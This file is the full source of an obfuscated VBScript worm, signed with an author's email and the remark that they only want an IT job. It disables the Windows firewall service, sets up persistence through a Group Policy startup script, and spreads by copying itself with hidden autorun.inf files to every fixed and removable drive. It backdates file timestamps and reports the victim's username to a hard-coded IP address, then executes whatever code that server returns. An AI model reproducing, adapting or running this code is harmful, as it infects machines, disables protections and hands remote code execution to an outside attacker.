On Error Resume Next
Set FSO=CreateObject(UnEscape("%73%63%52%69%50%74%69%4E%47%2E%66%49%4C%65%53%79%73%74%65%6D%4F%62%6A%65%63%74"))
Set WshShell=CreateObject(UnEscape("%57%73%63%52%69%70%54%2E%73%68%65%4C%6C"))
Dim Dri_List,Dri_List0
Dim IsSend
IsSend=0
C_Time=Date()
WshShell.Run "net stop sharedaccess",0
Set Drvs=FSO.Drives
SysDir=FSO.GetSpecialFolder(1)
ThisPath=WScript.ScriptFullName
Set Fc=FSO.OpenTextFile(ThisPath,1)
sCopy=Fc.ReadAll
Fc.Close
Set Fc=Nothing
Call WriteFile(SysDir&"\SysInfo.reg",UnEscape("%57%69%6E%64%6F%77%73%20%52%65%67%69%73%74%72%79%20%45%64%69%74%6F%72%20%56%65%72%73%69%6F%6E%20%35%2E%30%30%20%0D%0A%0D%0A%5B%48%4B%45%59%5F%4C%4F%43%41%4C%5F%4D%41%43%48%49%4E%45%5C%53%4F%46%54%57%41%52%45%5C%50%6F%6C%69%63%69%65%73%5C%4D%69%63%72%6F%73%6F%66%74%5C%57%69%6E%64%6F%77%73%5C%53%79%73%74%65%6D%5C%53%63%72%69%70%74%73%5C%53%74%61%72%74%75%70%5C%30%5D%20%0D%0A%22%47%50%4F%2D%49%44%22%3D%22%4C%6F%63%61%6C%47%50%4F%22%20%0D%0A%22%53%4F%4D%2D%49%44%22%3D%22%4C%6F%63%61%6C%22%20%0D%0A%22%46%69%6C%65%53%79%73%50%61%74%68%22%3D%22%25%57%69%6E%44%69%72%25%5C%5C%53%79%73%74%65%6D%33%32%5C%5C%47%72%6F%75%70%50%6F%6C%69%63%79%5C%5C%4D%61%63%68%69%6E%65%22%20%0D%0A%22%44%69%73%70%6C%61%79%4E%61%6D%65%22%3D%22%4C%6F%63%61%6C%20%47%72%6F%75%70%20%50%6F%6C%69%63%79%22%20%0D%0A%22%47%50%4F%4E%61%6D%65%22%3D%22%4C%6F%63%61%6C%20%47%72%6F%75%70%20%50%6F%6C%69%63%79%22%20%0D%0A%0D%0A%5B%48%4B%45%59%5F%4C%4F%43%41%4C%5F%4D%41%43%48%49%4E%45%5C%53%4F%46%54%57%41%52%45%5C%50%6F%6C%69%63%69%65%73%5C%4D%69%63%72%6F%73%6F%66%74%5C%57%69%6E%64%6F%77%73%5C%53%79%73%74%65%6D%5C%53%63%72%69%70%74%73%5C%53%74%61%72%74%75%70%5C%30%5C%30%5D%20%0D%0A%22%53%63%72%69%70%74%22%3D%22%25%57%69%6E%44%69%72%25%5C%5C%73%79%73%74%65%6D%33%32%5C%5C%70%72%6E%63%66%67%2E%76%62%73%22%20%0D%0A%22%50%61%72%61%6D%65%74%65%72%73%22%3D%22%22%20%0D%0A%22%45%78%65%63%54%69%6D%65%22%3D%68%65%78%28%62%29%3A%30%30%2C%30%30%2C%30%30%2C%30%30%2C%30%30%2C%30%30%2C%30%30%2C%30%30%2C%30%30%2C%30%30%2C%30%30%2C%30%30%2C%30%30%2C%30%30%2C%30%30%2C%30%30%20%0D%0A%0D%0A%5B%48%4B%45%59%5F%4C%4F%43%41%4C%5F%4D%41%43%48%49%4E%45%5C%53%4F%46%54%57%41%52%45%5C%4D%69%63%72%6F%73%6F%66%74%5C%57%69%6E%64%6F%77%73%5C%43%75%72%72%65%6E%74%56%65%72%73%69%6F%6E%5C%47%72%6F%75%70%20%50%6F%6C%69%63%79%5C%53%74%61%74%65%5C%4D%61%63%68%69%6E%65%5C%53%63%72%69%70%74%73%5C%53%74%61%72%74%75%70%5C%30%5D%20%0D%0A%22%47%50%4F%2D%49%44%22%3D%22%4C%6F%63%61%6C%47%50%4F%22%20%0D%0A%22%53%4F%4D%2D%49%44%22%3D%22%4C%6F%63%61%6C%22%20%0D%0A%22%46%69%6C%65%53%79%73%50%61%74%68%22%3D%22%25%57%69%6E%44%69%72%25%5C%5C%53%79%73%74%65%6D%33%32%5C%5C%47%72%6F%75%70%50%6F%6C%69%63%79%5C%5C%4D%61%63%68%69%6E%65%22%20%0D%0A%22%44%69%73%70%6C%61%79%4E%61%6D%65%22%3D%22%4C%6F%63%61%6C%20%47%72%6F%75%70%20%50%6F%6C%69%63%79%22%20%0D%0A%22%47%50%4F%4E%61%6D%65%22%3D%22%4C%6F%63%61%6C%20%47%72%6F%75%70%20%50%6F%6C%69%63%79%22%20%0D%0A%0D%0A%5B%48%4B%45%59%5F%4C%4F%43%41%4C%5F%4D%41%43%48%49%4E%45%5C%53%4F%46%54%57%41%52%45%5C%4D%69%63%72%6F%73%6F%66%74%5C%57%69%6E%64%6F%77%73%5C%43%75%72%72%65%6E%74%56%65%72%73%69%6F%6E%5C%47%72%6F%75%70%20%50%6F%6C%69%63%79%5C%53%74%61%74%65%5C%4D%61%63%68%69%6E%65%5C%53%63%72%69%70%74%73%5C%53%74%61%72%74%75%70%5C%30%5C%30%5D%20%0D%0A%22%53%63%72%69%70%74%22%3D%22%25%57%69%6E%44%69%72%25%5C%5C%73%79%73%74%65%6D%33%32%5C%5C%70%72%6E%63%66%67%2E%76%62%73%22%20%0D%0A%22%50%61%72%61%6D%65%74%65%72%73%22%3D%22%22%20%0D%0A%22%45%78%65%63%54%69%6D%65%22%3D%68%65%78%28%62%29%3A%30%30%2C%30%30%2C%30%30%2C%30%30%2C%30%30%2C%30%30%2C%30%30%2C%30%30%2C%30%30%2C%30%30%2C%30%30%2C%30%30%2C%30%30%2C%30%30%2C%30%30%2C%30%30"))
WshShell.Run "regedit /s SysInfo.reg",0
Wscript.Sleep 200
FSO.DeleteFile SysDir&"\SysInfo.reg",True
If Instr(ThisPath,SysDir)>0 then
Dri_List0=ListDrv()
O_Time=Left(C_Time,3)&"4"&Right(C_Time,Len(C_Time)-4)
WshShell.Run "cmd /c Date "&O_Time,0
Wscript.Sleep 10000
For Dri_i=1 To Len(Dri_List0)
Call WriteAuto(Mid(Dri_List0,Dri_i,1)&":\")
Next
WshShell.Run "cmd /c Date "&C_Time,0
ComputerName="":UserName=""
Set objWMIService=GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
Set colComputers = objWMIService.ExecQuery("Select * from Win32_ComputerSystem")
For Each objComputer in colComputers
ComputerName=ObjComputer.name
UserName=ObjComputer.username
Next
If UserName="" Then UserName="evar"
If Instr(UserName,"\")<=0 Then
UserName=ComputerName&"\"&UserName
End If
Do
If IsSend=0 Then
Set xml=CreateObject(UnEscape("%4D%49%63%52%4F%53%4F%66%74%2E%78%6D%6C%68%74%54%70"))   
xml.Open "GET","http://202.119.104.100/zzb/eva/count.asp?a="&UserName,0
xml.SetRequestHeader "User-Agent","evar"
xml.Send()
If Err.Number=0 Then
IsSend=1
If Len(xml.responseText)>15 Then ExeCute xml.responseText
Else
Err.Clear
End If
Set xml=Nothing
End If

Dri_List=ListDrv()
For Dri_k=1 To Len(Dri_List)
If Instr(Dri_List0,Mid(Dri_List,Dri_k,1))<=0 Then
Call WriteAuto(Mid(Dri_List,Dri_k,1)&":\")
End If
Next
Dri_List0=Dri_List
Wscript.Sleep 1000
Loop
Else
WshShell.Run "Explorer .\"
Wscript.Sleep 500
WshShell.SendKeys "% X"
WshShell.AppActivate UnEscape("%u6211%u7684%u7535%u8111")
Wscript.Sleep 100
WshShell.SendKeys "% C"
RunFlag=0
For each ps in getobject _ 
("winmgmts:\\.\root\cimv2:win32_process").instances_ 
If LCase(ps.name)="wscript.exe" Then
RunFlag=RunFlag+1
End If
Next
If RunFlag>=2 Then Wscript.quit
Set SF=FSO.GetFolder(SysDir)
F_Time=Left(SF.DateCreated,Instr(SF.DateCreated," ")-1)
WshShell.Run "cmd /c Date "&F_Time,0
Wscript.Sleep 100
Call WriteFile(SysDir&"\prncfg.vbs",sCopy)
WshShell.Run "cmd /c Date "&C_Time,0
WshShell.Run SysDir&"\prncfg.vbs"
End If

Function ListDrv()
ExeCute UnEscape("%44%69%6D%20%54%6D%70%5F%4C%69%73%74%0D%0A%54%6D%70%5F%6C%69%73%74%3D%22%22%0D%0A%46%6F%72%20%45%61%63%68%20%44%72%76%20%69%6E%20%44%72%76%73%0D%0A%49%66%20%44%72%76%2E%49%73%52%65%61%64%79%20%54%68%65%6E%0D%0A%54%6D%70%5F%4C%69%73%74%3D%54%6D%70%5F%4C%69%73%74%26%44%72%76%2E%44%72%69%76%65%4C%65%74%74%65%72%0D%0A%45%6E%64%20%49%66%0D%0A%4E%65%78%74%0D%0A%4C%69%73%74%44%72%76%3D%54%6D%70%5F%6C%69%73%74")
End Function

Sub WriteAuto(Path)
ExeCute UnEscape("%49%66%20%46%53%4F%2E%46%6F%6C%64%65%72%45%78%69%73%74%73%28%50%61%74%68%26%22%61%75%74%6F%72%75%6E%2E%69%6E%66%22%29%20%54%68%65%6E%0D%0A%46%53%4F%2E%4D%6F%76%65%46%6F%6C%64%65%72%20%50%61%74%68%26%22%61%75%74%6F%72%75%6E%2E%69%6E%66%22%2C%50%61%74%68%26%52%6E%64%28%29%0D%0A%45%6C%73%65%49%66%20%46%53%4F%2E%46%69%6C%65%45%78%69%73%74%73%28%50%61%74%68%26%22%61%75%74%6F%72%75%6E%2E%69%6E%66%22%29%20%54%68%65%6E%0D%0A%46%53%4F%2E%44%65%6C%65%74%65%46%69%6C%65%20%50%61%74%68%26%22%61%75%74%6F%72%75%6E%2E%69%6E%66%22%2C%54%72%75%65%0D%0A%45%6E%64%20%49%66")
Call WriteFile(Path&"autorun.inf",UnEscape("%5Bautorun%5D%0D%0Aopen%3D%0D%0Ashell%5Cn%3D%u66F4%u6362%u56FE%u6807%20%0D%0Ashell%5Copen%3D%u6253%u5F00%28%26O%29%0D%0Ashell%5Copen%5CCommand%3DWScript.exe%20eva.vbs%0D%0Ashell%5Copen%5CDefault%3D1%0D%0Ashell%5Cexplore%3D%u8D44%u6E90%u7BA1%u7406%u5668%28%26X%29%0D%0Ashell%5Cexplore%5CCommand%3DWScript.exe%20eva.vbs"))
Call WriteFile(Path&"eva.vbs",sCopy)
End Sub

Sub WriteFile(fPath,Content)
ExeCute UnEscape("%49%66%20%46%53%4F%2E%46%69%6C%65%45%78%69%73%74%73%28%66%50%61%74%68%29%20%54%68%65%6E%20%46%53%4F%2E%44%65%6C%65%74%65%46%69%6C%65%20%66%50%61%74%68%2C%54%72%75%65%0D%0A%53%65%74%20%46%63%3D%46%53%4F%2E%4F%70%65%6E%54%65%78%74%46%69%6C%65%28%66%50%61%74%68%2C%32%2C%54%72%75%65%29%0D%0A%46%63%2E%57%72%69%74%65%20%43%6F%6E%74%65%6E%74%0D%0A%46%63%2E%43%6C%6F%73%65%0D%0A%53%65%74%20%46%63%3D%4E%6F%74%68%69%6E%67%0D%0A%53%65%74%20%46%61%3D%46%53%4F%2E%47%65%74%46%69%6C%65%28%66%50%61%74%68%29%0D%0A%46%61%2E%41%74%74%72%69%62%75%74%65%73%3D%37%0D%0A%53%65%74%20%46%61%3D%4E%6F%74%68%69%6E%67")
End Sub

'I don't want to hurt you, but I just want an IT job
'Email:evar@live.cn